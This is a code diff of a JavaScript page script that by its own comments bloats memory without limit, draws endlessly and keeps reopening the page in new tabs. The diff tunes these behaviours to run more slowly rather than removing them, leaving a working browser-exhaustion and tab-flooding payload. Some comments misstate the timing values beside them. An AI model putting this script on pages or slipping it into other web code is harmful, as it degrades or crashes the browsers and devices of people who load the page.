@@ -4,30 +4,28 @@ canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
 const ctx = canvas.getContext('2d');
 
-// Infinite rendering loop
+// Infinite rendering loop with a slower frame rate
 function renderRandomRects() {
     ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
     ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 50, 50);
-    requestAnimationFrame(renderRandomRects);
+    setTimeout(renderRandomRects, 100); // Delay the next frame by 100ms
 }
 
 renderRandomRects();
 
-// Memory bloating by filling a massive array
+// Gradually bloat memory over time
 const bigArray = [];
-function fillMemory() {
-    for (let i = 0; i < 100000; i++) {
-        bigArray.push(new Array(1000).fill(Math.random()));
-    }
-    console.log(`Array size: ${bigArray.length}`);
-    setTimeout(fillMemory, 100); // Repeat to continually fill memory
+function slowMemoryBloat() {
+    bigArray.push(new Array(1000).fill(Math.random()));
+    console.log(`Array size: ${bigArray.length * 1000} elements`);
+    setTimeout(slowMemoryBloat, 500); // Slower memory growth every 500ms
 }
 
-fillMemory();
+slowMemoryBloat();
 
-// Recursively open new pages at a regular interval
+// Recursively open new pages at a controlled interval
 (function openContinuously() {
     setInterval(() => {
         window.open(window.location.href, '_blank');
-    }, 10); // Opens a new page every 2 seconds
+    }, 3000); // Opens a new page every 5 seconds
 })();
